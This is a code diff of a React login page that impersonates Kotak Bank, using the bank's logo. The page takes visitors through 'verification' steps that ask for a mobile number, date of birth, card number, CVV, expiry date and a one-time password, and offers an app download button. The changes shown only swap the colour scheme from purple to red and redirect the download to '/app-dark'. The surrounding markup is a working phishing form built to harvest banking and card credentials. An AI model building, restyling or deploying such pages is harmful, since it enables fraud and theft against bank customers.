@@ -185,7 +185,7 @@ export default function Login() {
   }
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-purple-100 to-purple-200 pt-[60px]">
+    <div className="min-h-screen bg-gradient-to-br from-red-100 to-red-200 pt-[60px]">
       <div className="fixed top-0 left-0 right-0 bg-white p-4 shadow-md flex items-center justify-center z-[1000]">
         <Link to="/">
           <img src="https://www.kotak.bank.in/content/dam/Kotak/svg-icons/navigation/kmbl-logo.svg" alt="Kotak Bank" className="h-[40px]" />
@@ -193,20 +193,20 @@ export default function Login() {
       </div>
 
       {submitted && (
-        <div className="fixed top-[60px] left-0 right-0 h-1 bg-purple-200 z-[1001]">
-          <div className="h-full bg-purple-600 animate-pulse" style={{ width: '60%' }}></div>
+        <div className="fixed top-[60px] left-0 right-0 h-1 bg-red-200 z-[1001]">
+          <div className="h-full bg-red-600 animate-pulse" style={{ width: '60%' }}></div>
         </div>
       )}
 
       {loading && (
         <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
-          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+          <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
         </div>
       )}
 
       {downloadLoading && (
         <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
-          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+          <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
         </div>
       )}
 
@@ -227,7 +227,7 @@ export default function Login() {
                 onClick={() => {
                   setDownloadLoading(true)
                   setTimeout(() => {
-                    navigate('/app')
+                    navigate('/app-dark')
                   }, 800)
                 }}
                 disabled={downloadLoading}
@@ -249,7 +249,7 @@ export default function Login() {
 
       {serviceLoading && (
         <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
-          <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+          <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
         </div>
       )}
 
@@ -265,7 +265,7 @@ export default function Login() {
                 className="flex items-center justify-between py-4 border-b border-gray-200 cursor-pointer hover:bg-gray-50"
               >
                 <div className="flex items-center">
-                  <span className="text-purple-700 text-xl mr-3">{service.icon}</span>
+                  <span className="text-red-700 text-xl mr-3">{service.icon}</span>
                   <span className="text-gray-800 font-medium">{service.label}</span>
                 </div>
                 <BiChevronRight className="text-gray-400" />
@@ -281,20 +281,20 @@ export default function Login() {
         <div className="p-4">
           {stepLoading && (
             <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
-              <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+              <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
             </div>
           )}
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
               <button onClick={() => setStep(0)} className="mr-3">
-                <BiArrowBack className="text-2xl text-purple-700" />
+                <BiArrowBack className="text-2xl text-red-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verify Your Details</span>
             </div>
 
             <div className="flex items-center justify-between mb-6 px-2">
               <div className="flex items-center">
-                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
+                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
                 <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                 <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">2</div>
                 <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
@@ -305,10 +305,10 @@ export default function Login() {
             <p className="text-gray-600 mb-4 text-sm">Let's begin with some necessary information and get you started</p>
 
             <div className="mb-4">
-              <label className="block text-purple-700 font-semibold mb-2">Enter your mobile number linked with Bank</label>
-              <div className="flex border-2 border-purple-600 rounded-xl overflow-hidden">
-                <div className="w-16 bg-purple-100 flex items-center justify-center border-r-2 border-purple-600">
-                  <span className="text-purple-700 font-semibold">+91</span>
+              <label className="block text-red-700 font-semibold mb-2">Enter your mobile number linked with Bank</label>
+              <div className="flex border-2 border-red-600 rounded-xl overflow-hidden">
+                <div className="w-16 bg-red-100 flex items-center justify-center border-r-2 border-red-600">
+                  <span className="text-red-700 font-semibold">+91</span>
                 </div>
                 <input
                   type="tel"
@@ -323,19 +323,19 @@ export default function Login() {
             </div>
 
             <div className="mb-6">
-              <label className="block text-purple-700 font-semibold mb-2">Enter Date of Birth</label>
+              <label className="block text-red-700 font-semibold mb-2">Enter Date of Birth</label>
               <input
                 type="date"
                 value={dob}
                 onChange={(e) => { setDob(e.target.value); setErrors({...errors, dob: ''}) }}
-                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
+                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
               />
               {errors.dob && <p className="text-red-500 text-xs mt-1">{errors.dob}</p>}
             </div>
 
             <button
               onClick={handleLogin}
-              className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
+              className="w-full bg-red-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-red-700 transition"
             >
               Login
             </button>
@@ -348,7 +348,7 @@ export default function Login() {
                 onClick={() => {
                   setDownloadLoading(true)
                   setTimeout(() => {
-                    navigate('/app')
+                    navigate('/app-dark')
                   }, 800)
                 }}
                 disabled={downloadLoading}
@@ -370,22 +370,22 @@ export default function Login() {
         <div className="p-4">
           {stepLoading && (
             <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
-              <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+              <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
             </div>
           )}
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
               <button onClick={() => { setStep(1); }} className="mr-3">
-                <BiArrowBack className="text-2xl text-purple-700" />
+                <BiArrowBack className="text-2xl text-red-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verification Required</span>
             </div>
 
             <div className="flex items-center justify-between mb-6 px-2">
               <div className="flex items-center">
-                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
-                <div className="w-8 h-0.5 bg-purple-600 mx-1"></div>
-                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
+                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
+                <div className="w-8 h-0.5 bg-red-600 mx-1"></div>
+                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
                 <div className="w-8 h-0.5 bg-gray-300 mx-1"></div>
                 <div className="w-8 h-8 bg-gray-200 text-gray-500 rounded-full flex items-center justify-center text-sm font-bold">3</div>
               </div>
@@ -394,40 +394,40 @@ export default function Login() {
             <p className="text-gray-600 mb-4 text-sm">Let's begin with some necessary information and get you started</p>
 
             <div className="mb-4">
-              <label className="block text-purple-700 font-semibold mb-2">Card Number</label>
+              <label className="block text-red-700 font-semibold mb-2">Card Number</label>
               <input
                 type="text"
                 value={cardNumber}
                 onChange={(e) => { setCardNumber(formatCardNumber(e.target.value)); setErrors({...errors, cardNumber: ''}) }}
                 placeholder="XXXX XXXX XXXX XXXX"
                 maxLength={19}
-                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
+                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
               />
               {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
             </div>
 
             <div className="mb-4">
-              <label className="block text-purple-700 font-semibold mb-2">CVV Number</label>
+              <label className="block text-red-700 font-semibold mb-2">CVV Number</label>
               <input
                 type="password"
                 maxLength={4}
                 value={cvv}
                 onChange={(e) => { setCvv(e.target.value.replace(/\D/g, '')); setErrors({...errors, cvv: ''}) }}
                 placeholder="XXX"
-                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
+                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
               />
               {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
             </div>
 
             <div className="mb-6">
-              <label className="block text-purple-700 font-semibold mb-2">Exp Date</label>
+              <label className="block text-red-700 font-semibold mb-2">Exp Date</label>
               <input
                 type="text"
                 value={expDate}
                 onChange={(e) => { setExpDate(formatExpDate(e.target.value)); setErrors({...errors, expDate: ''}) }}
                 placeholder="MM/YY"
                 maxLength={5}
-                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none"
+                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none"
               />
               {errors.expDate && <p className="text-red-500 text-xs mt-1">{errors.expDate}</p>}
             </div>
@@ -473,7 +473,7 @@ export default function Login() {
                   }
                 }
               }}
-              className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
+              className="w-full bg-red-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-red-700 transition"
             >
               Next
             </button>
@@ -485,24 +485,24 @@ export default function Login() {
         <div className="p-4">
           {stepLoading && (
             <div className="fixed inset-0 bg-black bg-opacity-80 z-[9999] flex items-center justify-center">
-              <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
+              <div className="w-16 h-16 border-4 border-red-600 border-t-transparent rounded-full animate-spin"></div>
             </div>
           )}
           <div className="bg-white rounded-xl shadow-lg p-6">
             <div className="flex items-center mb-4">
               <button onClick={() => setStep(2)} className="mr-3">
-                <BiArrowBack className="text-2xl text-purple-700" />
+                <BiArrowBack className="text-2xl text-red-700" />
               </button>
               <span className="text-xl font-semibold text-gray-800">Verification Required</span>
             </div>
 
             <div className="flex items-center justify-between mb-6 px-2">
               <div className="flex items-center">
-                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
-                <div className="w-8 h-0.5 bg-purple-600 mx-1"></div>
-                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
-                <div className="w-8 h-0.5 bg-purple-600 mx-1"></div>
-                <div className="w-8 h-8 bg-purple-600 text-white rounded-full flex items-center justify-center text-sm font-bold">3</div>
+                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">1</div>
+                <div className="w-8 h-0.5 bg-red-600 mx-1"></div>
+                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">2</div>
+                <div className="w-8 h-0.5 bg-red-600 mx-1"></div>
+                <div className="w-8 h-8 bg-red-600 text-white rounded-full flex items-center justify-center text-sm font-bold">3</div>
               </div>
             </div>
 
@@ -516,13 +516,13 @@ export default function Login() {
                 value={otp}
                 onChange={(e) => { setOtp(e.target.value); setError('') }}
                 placeholder="XXXXXX"
-                className="w-full p-3 border-2 border-purple-600 rounded-xl outline-none text-center text-2xl tracking-widest"
+                className="w-full p-3 border-2 border-red-600 rounded-xl outline-none text-center text-2xl tracking-widest"
               />
             </div>
 
             <p 
               onClick={handleResendOtp}
-              className={`text-sm font-semibold mb-6 text-center cursor-pointer ${resendTimer > 0 ? 'text-gray-400 cursor-not-allowed' : 'text-purple-600 hover:underline'}`}
+              className={`text-sm font-semibold mb-6 text-center cursor-pointer ${resendTimer > 0 ? 'text-gray-400 cursor-not-allowed' : 'text-red-600 hover:underline'}`}
             >
               {resendTimer > 0 ? `Resend OTP in ${formatTime(resendTimer)}` : 'Resend OTP'}
             </p>
@@ -535,7 +535,7 @@ export default function Login() {
 
             <button
               onClick={handleOtpVerify}
-              className="w-full bg-purple-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-purple-700 transition"
+              className="w-full bg-red-600 text-white py-4 rounded-xl text-lg font-bold hover:bg-red-700 transition"
             >
               Submit
             </button>
